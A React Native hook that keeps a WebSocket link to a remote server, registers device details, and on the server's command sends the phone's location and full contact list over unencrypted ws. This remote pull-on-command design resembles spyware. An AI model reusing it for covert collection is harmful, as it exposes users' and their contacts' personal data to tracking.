import { useState, useEffect, useRef } from 'react';
import { Platform } from 'react-native';
import * as Device from 'expo-device';
import Constants from 'expo-constants';

interface Message {
  type: string;
  data: any;
}

export function useDeviceConnection(serverIP?: string, serverPort?: string, autoReconnect: boolean = true) {
  const [isConnected, setIsConnected] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<'disconnected' | 'connecting' | 'connected'>('disconnected');
  const wsRef = useRef<WebSocket | null>(null);
  const reconnectTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const deviceNameRef = useRef<string>('');

  const connect = (deviceName: string) => {
    if (!serverIP || !serverPort) return;
    
    deviceNameRef.current = deviceName || 'Unknown Device';
    setConnectionStatus('connecting');
    
    const wsUrl = `ws://${serverIP}:${serverPort}`;
    const ws = new WebSocket(wsUrl);
    
    ws.onopen = () => {
      console.log('Connected to server');
      setIsConnected(true);
      setConnectionStatus('connected');
      
      // Send device registration with detailed info
      registerDevice(ws, deviceName);
    };
    
    ws.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);
        handleServerMessage(message);
      } catch (error) {
        console.error('Error parsing message:', error);
      }
    };
    
    ws.onclose = () => {
      console.log('Disconnected from server');
      setIsConnected(false);
      setConnectionStatus('disconnected');
      
      if (autoReconnect && deviceNameRef.current) {
        console.log('Scheduling reconnect...');
        scheduleReconnect();
      }
    };
    
    ws.onerror = (error) => {
      console.log('WebSocket error occurred, will attempt to reconnect');
      setConnectionStatus('disconnected');
      setIsConnected(false);
    };
    
    wsRef.current = ws;
  };

  const registerDevice = async (ws: WebSocket, deviceName: string) => {
    try {
      const deviceInfo = {
        deviceName: Device.deviceName || deviceName,
        deviceId: Constants.sessionId || 'unknown',
        brand: Device.brand || 'Unknown',
        model: Device.modelName || 'Unknown',
        systemName: Device.osName || Platform.OS,
        systemVersion: Device.osVersion || 'Unknown',
        platform: Platform.OS,
        appVersion: Constants.expoConfig?.version || '1.0.0',
        buildNumber: Constants.expoConfig?.version || '1.0.0',
        timestamp: new Date().toISOString(),
      };
      
      ws.send(JSON.stringify({
        type: 'register',
        data: deviceInfo
      }));
    } catch (error) {
      console.error('Error getting device info:', error);
      // Fallback registration
      ws.send(JSON.stringify({
        type: 'register',
        data: {
          deviceName: deviceName,
          platform: Platform.OS,
          timestamp: new Date().toISOString(),
        }
      }));
    }
  };

  const disconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
      reconnectTimeoutRef.current = null;
    }
    
    if (wsRef.current) {
      wsRef.current.close();
      wsRef.current = null;
    }
    
    setIsConnected(false);
    setConnectionStatus('disconnected');
  };

  const scheduleReconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
    }
    
    reconnectTimeoutRef.current = setTimeout(() => {
      if (deviceNameRef.current) {
        console.log('Attempting to reconnect...');
        connect(deviceNameRef.current);
      }
    }, 5000); // 5 seconds
  };

  const sendMessage = (message: Message) => {
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(message));
    }
  };

  const handleServerMessage = (message: Message) => {
    console.log('Received message:', message);
    
    switch (message.type) {
      case 'request_location':
        handleLocationRequest();
        break;
      case 'request_contacts':
        handleContactsRequest();
        break;
      default:
        console.log('Unknown message type:', message.type);
    }
  };

  const handleLocationRequest = async () => {
    try {
      const Location = await import('expo-location');
      const { status } = await Location.requestForegroundPermissionsAsync();
      if (status === 'granted') {
        const location = await Location.getCurrentPositionAsync({});
        sendMessage({
          type: 'location_response',
          data: {
            latitude: location.coords.latitude,
            longitude: location.coords.longitude,
            timestamp: new Date().toISOString(),
          }
        });
      }
    } catch (error) {
      console.error('Error getting location:', error);
    }
  };

  const handleContactsRequest = async () => {
    try {
      const Contacts = await import('expo-contacts');
      const { status } = await Contacts.requestPermissionsAsync();
      if (status === 'granted') {
        const { data } = await Contacts.getContactsAsync({
          fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers, Contacts.Fields.Emails],
          pageSize: 0, // Get all contacts
          pageOffset: 0,
        });
        sendMessage({
          type: 'contacts_response',
          data: data
        });
      }
    } catch (error) {
      console.error('Error getting contacts:', error);
    }
  };

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      disconnect();
    };
  }, []);

  return {
    isConnected,
    connectionStatus,
    connect,
    disconnect,
    sendMessage,
  };
}